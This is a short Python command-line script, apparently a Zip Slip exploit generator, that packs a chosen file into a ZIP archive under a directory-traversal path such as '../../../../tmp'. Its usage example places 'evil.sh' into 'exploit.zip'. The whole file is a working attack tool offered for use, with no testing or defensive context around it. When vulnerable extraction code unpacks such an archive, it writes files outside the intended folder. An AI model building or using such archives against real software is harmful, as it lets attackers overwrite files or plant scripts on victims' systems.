#!/usr/bin/env python3
"""
zip_slip_cli.py

A simple CLI to package a given file into a ZIP archive under a user-specified (potentially malicious) path.

Usage:
  zip_slip_cli.py <input_file> <path_prefix> [-o OUTPUT]

Example:
  zip_slip_cli.py evil.sh "../../../../../../../../tmp" -o exploit.zip
"""
import argparse
import os
import sys
import zipfile

def create_zip(input_file: str, path_prefix: str, output_zip: str):
    """
    Create a ZIP file that contains `input_file` under `path_prefix/basename(input_file)`.
    """
    if not os.path.isfile(input_file):
        print(f"Error: '{input_file}' is not a valid file.", file=sys.stderr)
        sys.exit(1)

    # Ensure the prefix does not accidentally normalize
    arc_name = os.path.join(path_prefix, os.path.basename(input_file))

    try:
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(input_file, arcname=arc_name)
        print(f"Created '{output_zip}' with entry '{arc_name}'")
    except Exception as e:
        print(f"Failed to create ZIP: {e}", file=sys.stderr)
        sys.exit(1)


def parse_args():
    parser = argparse.ArgumentParser(
        description="Package a file into a ZIP archive under a custom path (supports '../' sequences)."
    )
    parser.add_argument(
        'input_file',
        help='The file to include in the ZIP'
    )
    parser.add_argument(
        'path_prefix',
        help='The path prefix inside the ZIP (e.g., "../../../../tmp")'
    )
    parser.add_argument(
        '-o', '--output',
        default=None,
        help='Output ZIP filename (default: <input_file>.zip)'
    )
    return parser.parse_args()


def main():
    args = parse_args()
    output = args.output or f"{args.input_file}.zip"
    create_zip(args.input_file, args.path_prefix, output)


if __name__ == '__main__':
    main()
